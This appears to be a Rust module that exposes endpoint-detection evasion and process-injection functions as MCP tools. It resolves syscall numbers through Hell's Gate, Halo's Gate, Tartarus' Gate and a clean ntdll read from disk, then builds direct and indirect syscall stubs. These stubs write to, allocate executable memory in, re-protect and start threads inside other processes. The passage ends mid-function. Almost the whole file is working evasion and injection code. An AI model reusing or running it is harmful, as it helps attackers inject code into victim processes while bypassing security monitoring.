//! Direct Syscall implementation
//! Resolves SSN (System Service Numbers) from ntdll exports and builds
//! syscall stubs in RWX memory to bypass usermode hooks.
//! Falls back to reading clean ntdll from disk when in-memory copy is hooked.

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use crate::util::parse_address;
use serde_json::Value;

/// Resolve SSN (System Service Number) for an Nt* function from ntdll.
/// First tries in-memory ntdll. If hooked, falls back to clean ntdll from disk.
pub(crate) fn resolve_ssn(function_name: &str) -> Result<u32, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll: {}", e)))?;

        let mut name_buf = function_name.as_bytes().to_vec();
        name_buf.push(0);

        let func_addr =
            GetProcAddress(ntdll, windows::core::PCSTR(name_buf.as_ptr())).ok_or_else(|| {
                MemoricError::WindowsApi(format!("Function {} not found in ntdll", function_name))
            })?;

        let ptr = func_addr as *const u8;

        // Standard syscall stub pattern (Windows x64):
        // 4C 8B D1          mov r10, rcx      (offset 0, 3 bytes)
        // B8 xx xx 00 00    mov eax, <ssn>     (offset 3, 5 bytes)
        // Try offset +3 first (standard), then +4 (some versions)
        if *ptr.add(3) == 0xB8 {
            let ssn = u32::from_le_bytes([*ptr.add(4), *ptr.add(5), *ptr.add(6), *ptr.add(7)]);
            return Ok(ssn);
        }

        if *ptr.add(4) == 0xB8 {
            let ssn = u32::from_le_bytes([*ptr.add(5), *ptr.add(6), *ptr.add(7), *ptr.add(8)]);
            return Ok(ssn);
        }

        // Hooked — fall back to clean ntdll from disk
        tracing::warn!("{} appears hooked in memory (offset+3={:02X}, offset+4={:02X}), resolving from disk ntdll",
            function_name, *ptr.add(3), *ptr.add(4));

        resolve_ssn_from_disk(function_name)
    }
}

/// Resolve SSN from a clean ntdll.dll loaded directly from disk.
/// Maps the file read-only (not via LoadLibrary) to avoid hooks.
fn resolve_ssn_from_disk(function_name: &str) -> Result<u32, MemoricError> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_FLAGS_AND_ATTRIBUTES, FILE_GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING,
    };
    use windows::Win32::System::Memory::{
        CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ, PAGE_READONLY,
    };

    tracing::info!("[EVASION] Loading clean ntdll from disk for SSN resolution");

    unsafe {
        // Open ntdll.dll from disk
        let path: Vec<u16> = "C:\\Windows\\System32\\ntdll.dll\0"
            .encode_utf16()
            .collect();
        let file = CreateFileW(
            windows::core::PCWSTR(path.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open ntdll from disk: {}", e)))?;
        let file = SafeHandle::new(file);

        // Create file mapping
        let mapping = CreateFileMappingW(*file, None, PAGE_READONLY, 0, 0, None).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to create file mapping: {}", e))
        })?;
        let mapping = SafeHandle::new(mapping);

        // Map view
        let base = MapViewOfFile(*mapping, FILE_MAP_READ, 0, 0, 0);
        if base.Value.is_null() {
            return Err(MemoricError::WindowsApi(
                "Failed to map ntdll view".to_string(),
            ));
        }

        let result = parse_ntdll_exports(base.Value as *const u8, function_name);

        let _ = UnmapViewOfFile(base);

        result
    }
}

/// Parse PE export directory and extract SSN from the clean syscall stub.
fn parse_ntdll_exports(base_ptr: *const u8, function_name: &str) -> Result<u32, MemoricError> {
    unsafe {
        // DOS header: e_lfanew at offset 0x3C
        let e_lfanew = *(base_ptr.add(0x3C) as *const u32) as usize;
        let nt_headers = base_ptr.add(e_lfanew);

        // Verify PE signature "PE\0\0"
        if *(nt_headers as *const u32) != 0x00004550 {
            return Err(MemoricError::WindowsApi(
                "Invalid PE signature in ntdll".to_string(),
            ));
        }

        // PE32+ optional header starts at nt_headers + 24
        let optional_header = nt_headers.add(24);

        // Verify PE32+ magic (0x20B)
        let magic = *(optional_header as *const u16);
        if magic != 0x20B {
            return Err(MemoricError::WindowsApi(format!(
                "Expected PE32+ (0x20B), got 0x{:04X}",
                magic
            )));
        }

        // Export directory: data directory[0] at offset 112 from optional header
        let export_dir_rva = *(optional_header.add(112) as *const u32) as usize;
        if export_dir_rva == 0 {
            return Err(MemoricError::WindowsApi(
                "No export directory in ntdll".to_string(),
            ));
        }

        let export_dir = base_ptr.add(export_dir_rva);

        // IMAGE_EXPORT_DIRECTORY fields
        let num_names = *(export_dir.add(24) as *const u32);
        let addr_functions_rva = *(export_dir.add(28) as *const u32) as usize;
        let addr_names_rva = *(export_dir.add(32) as *const u32) as usize;
        let addr_ordinals_rva = *(export_dir.add(36) as *const u32) as usize;

        let names = base_ptr.add(addr_names_rva) as *const u32;
        let ordinals = base_ptr.add(addr_ordinals_rva) as *const u16;
        let functions = base_ptr.add(addr_functions_rva) as *const u32;

        // Find the function by name
        for i in 0..num_names {
            let name_rva = *names.add(i as usize);
            let name_ptr = base_ptr.add(name_rva as usize);
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8);

            if name.to_bytes() == function_name.as_bytes() {
                let ordinal = *ordinals.add(i as usize);
                let func_rva = *functions.add(ordinal as usize);
                let func_ptr = base_ptr.add(func_rva as usize);

                // Read SSN from clean stub
                // Try offset +3 (standard: 4C 8B D1 B8 xx xx xx xx)
                if *func_ptr.add(3) == 0xB8 {
                    let ssn = u32::from_le_bytes([
                        *func_ptr.add(4),
                        *func_ptr.add(5),
                        *func_ptr.add(6),
                        *func_ptr.add(7),
                    ]);
                    tracing::info!(
                        "[EVASION] Resolved {} SSN={} from disk ntdll",
                        function_name,
                        ssn
                    );
                    return Ok(ssn);
                }

                // Try offset +4 as fallback
                if *func_ptr.add(4) == 0xB8 {
                    let ssn = u32::from_le_bytes([
                        *func_ptr.add(5),
                        *func_ptr.add(6),
                        *func_ptr.add(7),
                        *func_ptr.add(8),
                    ]);
                    tracing::info!(
                        "[EVASION] Resolved {} SSN={} from disk ntdll (offset+4)",
                        function_name,
                        ssn
                    );
                    return Ok(ssn);
                }

                return Err(MemoricError::WindowsApi(format!(
                    "{} has unexpected stub pattern even in disk ntdll (byte@3={:02X}, byte@4={:02X})",
                    function_name, *func_ptr.add(3), *func_ptr.add(4)
                )));
            }
        }

        Err(MemoricError::WindowsApi(format!(
            "{} not found in disk ntdll exports",
            function_name
        )))
    }
}

/// Build a syscall stub in W^X memory.
/// Returns a function pointer that can be called with the appropriate arguments.
/// Stub layout:
///   mov r10, rcx     (49 89 CA)  - Windows syscall convention
///   mov eax, <ssn>   (B8 xx xx xx xx)
///   syscall           (0F 05)
///   ret               (C3)
pub fn build_syscall_stub(ssn: u32) -> Result<*const u8, MemoricError> {
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };

    let stub: [u8; 12] = [
        0x49,
        0x89,
        0xCA, // mov r10, rcx
        0xB8, // mov eax, imm32
        (ssn & 0xFF) as u8,
        ((ssn >> 8) & 0xFF) as u8,
        ((ssn >> 16) & 0xFF) as u8,
        ((ssn >> 24) & 0xFF) as u8,
        0x0F,
        0x05, // syscall
        0xC3, // ret
        0x90, // nop (padding)
    ];

    unsafe {
        let mem = VirtualAlloc(None, stub.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if mem.is_null() {
            return Err(MemoricError::WindowsApi(
                "Failed to allocate memory for syscall stub".to_string(),
            ));
        }

        std::ptr::copy_nonoverlapping(stub.as_ptr(), mem as *mut u8, stub.len());

        // W^X: flip to execute-read
        let mut old = PAGE_READWRITE;
        VirtualProtect(mem, stub.len(), PAGE_EXECUTE_READ, &mut old)
            .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtect failed: {}", e)))?;

        Ok(mem as *const u8)
    }
}

/// Resolve SSN for a given Nt* function (MCP tool)
pub fn resolve_syscall_number(args: &Value) -> Result<Value, MemoricError> {
    let function = args
        .get("function_name")
        .and_then(|v| v.as_str())
        .or_else(|| args.get("function").and_then(|v| v.as_str()))
        .ok_or_else(|| MemoricError::WindowsApi("Missing function_name or function".to_string()))?;

    tracing::info!("[EVASION] Resolving SSN for {}", function);

    let ssn = resolve_ssn(function)?;

    Ok(serde_json::json!({
        "function": function,
        "ssn": ssn,
        "ssn_hex": format!("0x{:04X}", ssn),
        "message": format!("SSN for {} = {}", function, ssn)
    }))
}

/// Write memory via direct syscall (NtWriteVirtualMemory)
pub fn syscall_write_memory(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let bytes = args
        .get("bytes")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing bytes".to_string()))?;

    let byte_vec: Vec<u8> = bytes
        .iter()
        .filter_map(|v| v.as_u64())
        .map(|v| v as u8)
        .collect();

    tracing::warn!(
        "[EVASION] Direct syscall write: {} bytes to 0x{:016X} in PID {}",
        byte_vec.len(),
        address,
        pid
    );

    let ssn = resolve_ssn("NtWriteVirtualMemory")?;
    let stub = build_syscall_stub(ssn)?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = crate::safe_handle::SafeHandle::new(handle);

        // NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten)
        type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *mut std::ffi::c_void,
            *const std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        let syscall_fn: NtWriteVirtualMemoryFn = std::mem::transmute(stub);
        let mut bytes_written = 0usize;

        let status = syscall_fn(
            handle.raw().0 as isize,
            address as *mut std::ffi::c_void,
            byte_vec.as_ptr() as *const std::ffi::c_void,
            byte_vec.len(),
            &mut bytes_written,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtWriteVirtualMemory failed with NTSTATUS: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "direct_syscall",
            "ssn": ssn,
            "bytes_written": bytes_written,
            "address": format!("0x{:016X}", address),
            "message": "Memory written via direct syscall (bypasses usermode hooks)"
        }))
    }
}

/// Protect memory via direct syscall (NtProtectVirtualMemory)
pub fn syscall_protect_memory(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let protection = args
        .get("protection")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x40) as u32; // PAGE_EXECUTE_READWRITE

    tracing::warn!(
        "[EVASION] Direct syscall protect: 0x{:016X} size={} prot=0x{:X} in PID {}",
        address,
        size,
        protection,
        pid
    );

    let ssn = resolve_ssn("NtProtectVirtualMemory")?;
    let stub = build_syscall_stub(ssn)?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = crate::safe_handle::SafeHandle::new(handle);

        // NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, NewProtect, OldProtect)
        type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *mut *mut std::ffi::c_void,
            *mut usize,
            u32,
            *mut u32,
        ) -> i32;

        let syscall_fn: NtProtectVirtualMemoryFn = std::mem::transmute(stub);
        let mut base = address as *mut std::ffi::c_void;
        let mut region_size = size;
        let mut old_protect = 0u32;

        let status = syscall_fn(
            handle.raw().0 as isize,
            &mut base,
            &mut region_size,
            protection,
            &mut old_protect,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtProtectVirtualMemory failed with NTSTATUS: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "direct_syscall",
            "ssn": ssn,
            "address": format!("0x{:016X}", address),
            "size": region_size,
            "new_protection": format!("0x{:X}", protection),
            "old_protection": format!("0x{:X}", old_protect),
            "message": "Memory protection changed via direct syscall"
        }))
    }
}

/// Allocate memory via direct syscall (NtAllocateVirtualMemory)
pub fn syscall_alloc_memory(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let protection = args
        .get("protection")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x40) as u32; // PAGE_EXECUTE_READWRITE

    tracing::warn!(
        "[EVASION] Direct syscall alloc: size={} prot=0x{:X} in PID {}",
        size,
        protection,
        pid
    );

    let ssn = resolve_ssn("NtAllocateVirtualMemory")?;
    let stub = build_syscall_stub(ssn)?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = crate::safe_handle::SafeHandle::new(handle);

        // NtAllocateVirtualMemory(ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
        type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *mut *mut std::ffi::c_void,
            usize,
            *mut usize,
            u32,
            u32,
        ) -> i32;

        let syscall_fn: NtAllocateVirtualMemoryFn = std::mem::transmute(stub);
        let mut base_address: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut region_size = size;

        let status = syscall_fn(
            handle.raw().0 as isize,
            &mut base_address,
            0,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            protection,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "direct_syscall",
            "ssn": ssn,
            "address": format!("0x{:016X}", base_address as usize),
            "size": region_size,
            "protection": format!("0x{:X}", protection),
            "message": "Memory allocated via direct syscall (bypasses usermode hooks)"
        }))
    }
}

/// NtCreateThreadEx syscall injection - more stealthy than CreateRemoteThread
pub fn syscall_create_thread(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let start_address = args
        .get("start_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::InjectionFailed("Missing start_address".to_string()))?;

    tracing::warn!(
        "[EVASION] NtCreateThreadEx syscall injection: PID {} at 0x{:X}",
        pid,
        start_address
    );

    let ssn = resolve_ssn("NtCreateThreadEx")?;
    let stub = build_syscall_stub(ssn)?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = crate::safe_handle::SafeHandle::new(handle);

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *mut std::ffi::c_void,
            isize,
            *mut std::ffi::c_void,
            *mut std::ffi::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::ffi::c_void,
        ) -> i32;

        let syscall_fn: NtCreateThreadExFn = std::mem::transmute(stub);
        let mut thread_handle: isize = 0;

        let status = syscall_fn(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            handle.raw().0 as isize,
            start_address as *mut _,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateThreadEx failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "syscall_create_thread",
            "ssn": ssn,
            "thread_handle": thread_handle,
            "message": "Thread created via direct syscall (bypasses usermode hooks)"
        }))
    }
}

/// Indirect syscall write - jumps to syscall;ret gadget in ntdll instead of embedding syscall opcode
pub fn indirect_syscall_write(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let bytes = args
        .get("bytes")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing bytes".to_string()))?;

    let byte_vec: Vec<u8> = bytes
        .iter()
        .filter_map(|v| v.as_u64())
        .map(|v| v as u8)
        .collect();

    let ssn = resolve_ssn("NtWriteVirtualMemory")?;
    let gadget = find_syscall_ret_gadget()?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = crate::safe_handle::SafeHandle::new(handle);

        let stub = build_indirect_syscall_stub(ssn, gadget)?;

        type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *mut std::ffi::c_void,
            *const std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        let syscall_fn: NtWriteVirtualMemoryFn = std::mem::transmute(stub);
        let mut bytes_written = 0usize;

        let status = syscall_fn(
            handle.raw().0 as isize,
            address as *mut _,
            byte_vec.as_ptr() as *const _,
            byte_vec.len(),
            &mut bytes_written,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "Indirect NtWriteVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "ssn": ssn,
            "gadget_address": format!("0x{:016X}", gadget),
            "bytes_written": bytes_written,
            "message": "Memory written via indirect syscall"
        }))
    }
}

/// Indirect syscall alloc
pub fn indirect_syscall_alloc(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let protection = args
        .get("protection")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x40) as u32;

    let ssn = resolve_ssn("NtAllocateVirtualMemory")?;
    let gadget = find_syscall_ret_gadget()?;

    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION, false, pid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = crate::safe_handle::SafeHandle::new(handle);

        let stub = build_indirect_syscall_stub(ssn, gadget)?;

        type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
            isize,
            *mut *mut std::ffi::c_void,
            usize,
            *mut usize,
            u32,
            u32,
        ) -> i32;

        let syscall_fn: NtAllocateVirtualMemoryFn = std::mem::transmute(stub);
        let mut base_address: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut region_size = size;

        let status = syscall_fn(
            handle.raw().0 as isize,
            &mut base_address,
            0,
            &mut region_size,
            0x3000,
            protection,
        );

        if status < 0 {
            return Err(MemoricError::WindowsApi(format!(
                "Indirect NtAllocateVirtualMemory failed: 0x{:08X}",
                status as u32
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "indirect_syscall",
            "ssn": ssn,
            "gadget_address": format!("0x{:016X}", gadget),
            "address": format!("0x{:016X}", base_address as usize),
            "size": region_size,
            "message": "Memory allocated via indirect syscall"
        }))
    }
}

/// Hell's Gate resolve - derive SSN from neighboring functions when ntdll is hooked
pub fn hells_gate_resolve(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let function = args
        .get("function")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function name".to_string()))?;

    tracing::info!("[EVASION] Hell's Gate SSN resolution for {}", function);

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll: {}", e)))?;

        let mut name_buf = function.as_bytes().to_vec();
        name_buf.push(0);
        let func_addr = GetProcAddress(ntdll, windows::core::PCSTR(name_buf.as_ptr()))
            .ok_or_else(|| MemoricError::WindowsApi(format!("{} not found", function)))?;

        let ptr = func_addr as *const u8;

        // Check if hooked (no mov eax at offset+3)
        if *ptr.add(3) == 0xB8 {
            let ssn = u32::from_le_bytes([*ptr.add(4), *ptr.add(5), *ptr.add(6), *ptr.add(7)]);
            return Ok(serde_json::json!({
                "function": function,
                "ssn": ssn,
                "method": "direct",
                "hooked": false
            }));
        }

        // Function is hooked - scan neighbors
        // Check function below (next Nt* at +32 bytes typical)
        for offset in [32i64, -32, 64, -64] {
            let neighbor = (func_addr as *const u8).offset(offset as isize);
            if *neighbor.add(3) == 0xB8 {
                let neighbor_ssn = u32::from_le_bytes([
                    *neighbor.add(4),
                    *neighbor.add(5),
                    *neighbor.add(6),
                    *neighbor.add(7),
                ]);
                let inferred_ssn = if offset > 0 {
                    neighbor_ssn.wrapping_sub((offset / 32) as u32)
                } else {
                    neighbor_ssn.wrapping_add(((-offset) / 32) as u32)
                };

                return Ok(serde_json::json!({
                    "function": function,
                    "ssn": inferred_ssn,
                    "method": "hells_gate",
                    "hooked": true,
                    "neighbor_offset": offset,
                    "neighbor_ssn": neighbor_ssn
                }));
            }
        }

        Err(MemoricError::WindowsApi(format!(
            "Hell's Gate failed: all neighbors hooked for {}",
            function
        )))
    }
}

/// Find syscall;ret gadget in ntdll .text section
fn find_syscall_ret_gadget() -> Result<usize, MemoricError> {
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll: {}", e)))?;

        let base = ntdll.0 as *const u8;
        let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
        let nt_headers = base.add(e_lfanew);
        let optional = nt_headers.add(24);
        let num_sections = *(nt_headers.add(6) as *const u16);
        let section_header = optional.add(240);

        for i in 0..num_sections {
            let section = section_header.add(i as usize * 40);
            let name = std::slice::from_raw_parts(section, 8);
            if &name[0..5] == b".text" {
                let rva = *(section.add(12) as *const u32) as usize;
                let size = *(section.add(8) as *const u32) as usize;
                let text_start = base.add(rva);

                for j in 0..size.saturating_sub(2) {
                    if *text_start.add(j) == 0x0F
                        && *text_start.add(j + 1) == 0x05
                        && *text_start.add(j + 2) == 0xC3
                    {
                        return Ok(text_start.add(j) as usize);
                    }
                }
            }
        }

        Err(MemoricError::WindowsApi(
            "syscall;ret gadget not found in ntdll".to_string(),
        ))
    }
}

/// Build indirect syscall stub - jumps to gadget instead of embedding syscall opcode
fn build_indirect_syscall_stub(ssn: u32, gadget: usize) -> Result<*const u8, MemoricError> {
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };

    // mov r10, rcx
    // mov eax, <ssn>
    // mov r11, <gadget_addr>
    // jmp r11
    let mut stub = Vec::with_capacity(32);
    stub.extend_from_slice(&[0x49, 0x89, 0xCA]); // mov r10, rcx
    stub.push(0xB8); // mov eax, imm32
    stub.extend_from_slice(&ssn.to_le_bytes());
    stub.extend_from_slice(&[0x49, 0xBB]); // mov r11, imm64
    stub.extend_from_slice(&(gadget as u64).to_le_bytes());
    stub.extend_from_slice(&[0x41, 0xFF, 0xE3]); // jmp r11

    unsafe {
        let mem = VirtualAlloc(None, stub.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if mem.is_null() {
            return Err(MemoricError::WindowsApi(
                "Failed to allocate stub memory".to_string(),
            ));
        }
        std::ptr::copy_nonoverlapping(stub.as_ptr(), mem as *mut u8, stub.len());

        // W^X: flip to execute-read
        let mut old = PAGE_READWRITE;
        VirtualProtect(mem, stub.len(), PAGE_EXECUTE_READ, &mut old)
            .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtect failed: {}", e)))?;

        Ok(mem as *const u8)
    }
}

// ===== #12 Halo's Gate / Tartarus' Gate =====

/// Halo's Gate — walk neighboring syscalls to resolve SSN when target is hooked
/// Falls back to Tartarus' Gate (walks further, handles partial hooks)
pub fn halos_gate_resolve(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let function = args
        .get("function")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function name".to_string()))?;
    let max_distance = args
        .get("max_distance")
        .and_then(|v| v.as_u64())
        .unwrap_or(500) as i64;

    tracing::info!(
        "[EVASION] Halo's Gate / Tartarus' Gate SSN resolution for {}",
        function
    );

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll: {}", e)))?;

        let mut name_buf = function.as_bytes().to_vec();
        name_buf.push(0);
        let func_addr = GetProcAddress(ntdll, windows::core::PCSTR(name_buf.as_ptr()))
            .ok_or_else(|| MemoricError::WindowsApi(format!("{} not found", function)))?;

        let ptr = func_addr as *const u8;

        // Check if function is not hooked (standard stub)
        if *ptr.add(0) == 0x4C && *ptr.add(1) == 0x8B && *ptr.add(2) == 0xD1 && *ptr.add(3) == 0xB8
        {
            let ssn = u32::from_le_bytes([*ptr.add(4), *ptr.add(5), *ptr.add(6), *ptr.add(7)]);
            return Ok(serde_json::json!({
                "success": true,
                "function": function,
                "ssn": ssn,
                "method": "direct",
                "hooked": false,
                "message": format!("{} is not hooked, SSN={}", function, ssn)
            }));
        }

        tracing::warn!(
            "{} is hooked, trying Halo's Gate / Tartarus' Gate",
            function
        );

        // Halo's Gate: walk neighboring syscall stubs
        // Each syscall stub is typically 32 bytes apart
        // SSN difference matches position difference
        let stub_size: isize = 32;

        for distance in 1..=max_distance {
            // Try function BELOW (higher address = higher SSN)
            let neighbor_down = (ptr as *const u8).offset(distance as isize * stub_size);
            if is_valid_syscall_stub(neighbor_down) {
                let neighbor_ssn = u32::from_le_bytes([
                    *neighbor_down.add(4),
                    *neighbor_down.add(5),
                    *neighbor_down.add(6),
                    *neighbor_down.add(7),
                ]);
                let ssn = neighbor_ssn.wrapping_sub(distance as u32);
                return Ok(serde_json::json!({
                    "success": true,
                    "function": function,
                    "ssn": ssn,
                    "method": if distance <= 2 { "halos_gate" } else { "tartarus_gate" },
                    "hooked": true,
                    "neighbor_distance": distance,
                    "neighbor_direction": "down",
                    "neighbor_ssn": neighbor_ssn,
                    "message": format!("{} hooked, SSN={} resolved via {} (distance {})", function, ssn, if distance <= 2 { "Halo's Gate" } else { "Tartarus' Gate" }, distance)
                }));
            }

            // Try function ABOVE (lower address = lower SSN)
            let neighbor_up = (ptr as *const u8).offset(-(distance as isize) * stub_size);
            if is_valid_syscall_stub(neighbor_up) {
                let neighbor_ssn = u32::from_le_bytes([
                    *neighbor_up.add(4),
                    *neighbor_up.add(5),
                    *neighbor_up.add(6),
                    *neighbor_up.add(7),
                ]);
                let ssn = neighbor_ssn.wrapping_add(distance as u32);
                return Ok(serde_json::json!({
                    "success": true,
                    "function": function,
                    "ssn": ssn,
                    "method": if distance <= 2 { "halos_gate" } else { "tartarus_gate" },
                    "hooked": true,
                    "neighbor_distance": distance,
                    "neighbor_direction": "up",
                    "neighbor_ssn": neighbor_ssn,
                    "message": format!("{} hooked, SSN={} resolved via {} (distance {})", function, ssn, if distance <= 2 { "Halo's Gate" } else { "Tartarus' Gate" }, distance)
                }));
            }
        }

        // All neighbors hooked — try disk fallback
        tracing::warn!(
            "Halo's/Tartarus' Gate failed for {}, attempting disk fallback",
            function
        );
        let ssn = resolve_ssn_from_disk(function)?;

        Ok(serde_json::json!({
            "success": true,
            "function": function,
            "ssn": ssn,
            "method": "disk_fallback",
            "hooked": true,
            "message": format!("{} and all neighbors hooked, SSN={} from disk ntdll", function, ssn)
        }))
    }
}

/// Check if a pointer looks like a valid unhooked syscall stub
/// Pattern: 4C 8B D1 B8 xx xx 00 00
unsafe fn is_valid_syscall_stub(ptr: *const u8) -> bool {
